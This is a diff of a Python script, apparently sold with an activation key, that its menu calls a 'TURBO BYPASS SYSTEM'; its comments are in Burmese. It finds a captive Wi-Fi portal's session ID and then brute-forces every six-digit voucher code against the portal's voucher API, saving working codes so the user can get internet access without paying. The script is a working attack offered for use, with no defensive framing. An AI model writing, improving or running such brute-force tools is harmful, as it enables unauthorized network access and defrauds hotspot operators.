@@ -15,26 +15,27 @@ SECRET_SALT = "ohmygod@123"
 PING_THREADS = 30
 PING_INTERVAL = 0.05
 SUCCESS_FILE = "success.txt"
-FAIL_FILE = "fail.txt"
 
 def get_stable_id():
+    """Device တစ်ခုအတွက် ပုံသေဖြစ်နေမည့် Hardware ID ကို ထုတ်ပေးခြင်း"""
     try:
         serial = os.popen("getprop ro.serialno").read().strip()
         if not serial:
             serial = os.popen("getprop ro.build.display.id").read().strip()
     except:
         serial = "DEFAULT_NODE"
-    fixed_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
-    return f"TRB-{fixed_hash}"
+    return f"TRB-{hashlib.md5(serial.encode()).hexdigest()[:10].upper()}"
 
 def verify_activation():
+    """Activation key စစ်ဆေးခြင်း logic"""
     device_id = get_stable_id()
     key_file = os.path.join(os.path.expanduser("~"), ".turbo_license")
     correct_key = hashlib.sha256(f"{device_id}{SECRET_SALT}".encode()).hexdigest()[:12].upper()
     
     if os.path.exists(key_file):
         with open(key_file, "r") as f:
-            if f.read().strip() == correct_key: return True
+            if f.read().strip() == correct_key:
+                return True
 
     print(f"DEVICE ID: {device_id}")
     input_key = input("Enter Activation Key: ").strip().upper()
@@ -43,78 +44,88 @@ def verify_activation():
         return True
     return False
 
-def check_real_internet():
+def check_internet():
     try:
-        return requests.get("http://www.google.com", timeout=0.8).status_code == 200
+        return requests.get("http://www.google.com", timeout=1).status_code == 200
     except: return False
 
-def get_portal_info():
-    """Portal URL နှင့် Session ID ကို ရှာဖွေပေးရန်"""
+def get_portal_session():
+    """Portal ရဲ့ Session ID နှင့် လိုအပ်သော URL များကို ရှာဖွေခြင်း"""
     try:
         r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
+        if r.url == "http://connectivitycheck.gstatic.com/generate_204": return None, None, None
+        
         portal_url = r.url
-        parsed_portal = urlparse(portal_url)
-        portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+        parsed = urlparse(portal_url)
+        host = f"{parsed.scheme}://{parsed.netloc}"
         
-        session = requests.Session()
-        r1 = session.get(portal_url, verify=False, timeout=5)
-        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
-        next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
-        r2 = session.get(next_url, verify=False, timeout=5)
-        
-        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
-        return portal_host, sid, parsed_portal.query
-    except:
-        return None, None, None
+        # Session ID ကို URL query ထဲမှ ရှာခြင်း
+        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
+        return host, sid, parsed.query
+    except: return None, None, None
 
-def bruteforce_vouchers(portal_host, sid):
-    print(f"\n[*] Starting Bruteforce for SID: {sid}")
-    voucher_api = f"{portal_host}/api/auth/voucher/"
+def start_bruteforce(host, sid):
+    """Voucher code များကို 000000 မှ 999999 အထိ အလိုအလျောက် စမ်းသပ်ခြင်း"""
+    print(f"\n[!] Starting Bruteforce for SID: {sid}")
+    api_url = f"{host}/api/auth/voucher/"
     
-    # စမ်းသပ်ပြီးသား code များကို skip ရန် (optional)
+    # စမ်းသပ်မည့် range (ဗီဒီယိုထဲကအတိုင်း 6 digit)
     for i in range(1000000):
         code = f"{i:06d}"
         try:
-            resp = requests.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
+            payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
+            resp = requests.post(api_url, json=payload, timeout=2)
+            
             if resp.status_code == 200:
-                print(f"\n[✔] SUCCESS CODE FOUND: {code}")
-                with open(SUCCESS_FILE, "a") as f: f.write(f"{code}\n")
+                print(f"\n[✔] SUCCESS: {code}")
+                with open(SUCCESS_FILE, "a") as f: f.write(f"{code} | {time.ctime()}\n")
                 return code
             else:
-                print(f"Fail Code: {code} ", end='\r')
-                # Optional: with open(FAIL_FILE, "a") as f: f.write(f"{code}\n")
-        except:
-            continue
+                print(f"[*] Testing Code: {code} (Failed)  ", end='\r')
+        except: continue
     return None
 
-def start_process(option):
-    print(f"[*] Initializing...")
-    host, sid, query = get_portal_info()
-    
-    if not sid:
-        print("[-] Could not find Portal Session. Are you connected to the network?")
+def main_menu():
+    if not verify_activation():
+        print("Access Denied.")
         return
 
-    if option == '2':
-        voucher = bruteforce_vouchers(host, sid)
-        if not voucher: return
-    else:
-        voucher = '123456' # Default or logic for Option 3
+    os.system('clear')
+    print("="*30)
+    print(" TURBO BYPASS SYSTEM ")
+    print("="*30)
+    print("1) Get Internet Access")
+    print("2) Bruteforce Access Voucher Code")
+    print("3) Recheck Success Code")
+    print("="*30)
+    
+    choice = input("Enter an Option: ")
+    
+    host, sid, query = get_portal_session()
+    if not sid:
+        print("\n[!] Error: No Portal Session Found. Check Wifi Connection.")
+        return
 
-    # Authentication & Pinging Logic
-    params = parse_qs(query)
-    gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
-    gw_port = params.get('gw_port', ['2060'])[0]
-    auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
-
-    print(f"[*] Activating with {voucher}...")
-    # (Pinging logic follows your original threading code here)
+    if choice == '1':
+        # ပုံမှန်အတိုင်း Token နှင့် ကျော်ခြင်း
+        print(f"[*] Using Default Bypass for SID: {sid}")
+        # အောက်တွင် သင်၏ မူလ Pinging logic ကို ထည့်သွင်းနိုင်သည်
+        
+    elif choice == '2':
+        found_code = start_bruteforce(host, sid)
+        if found_code:
+            print(f"\n[!] Success! Use {found_code} to login.")
+            
+    elif choice == '3':
+        if os.path.exists(SUCCESS_FILE):
+            print("\n--- Saved Success Codes ---")
+            with open(SUCCESS_FILE, "r") as f: print(f.read())
+        else:
+            print("\n[!] No history found.")
 
 if __name__ == "__main__":
-    if verify_activation():
-        print("\n1) Get Internet Access")
-        print("2) Bruteforce Access Voucher Code")
-        print("3) Recheck Success Code")
-        choice = input("\nEnter an Option: ")
-        start_process(choice)
+    try:
+        main_menu()
+    except KeyboardInterrupt:
+        print("\nStopped.")
         
